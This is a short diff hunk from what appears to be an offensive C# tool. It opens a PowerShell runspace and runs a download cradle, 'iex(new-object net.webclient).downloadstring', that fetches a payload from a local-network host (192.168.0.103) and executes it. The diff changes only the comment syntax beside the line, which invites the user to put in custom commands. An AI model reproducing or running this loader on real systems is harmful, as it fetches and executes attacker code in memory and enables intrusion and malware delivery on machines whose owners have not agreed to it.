@@ -67,7 +67,7 @@
               PowerShell shell = PowerShell.Create();
               shell.Runspace = run;
 
-              String exec = "iex(new-object net.webclient).downloadstring('http://192.168.0.103/payload')"; <!-- Modify for custom commands -->
+              String exec = "iex(new-object net.webclient).downloadstring('http://192.168.0.103/payload')"; // Modify for custom commands
               shell.AddScript(exec);
               shell.Invoke();
 
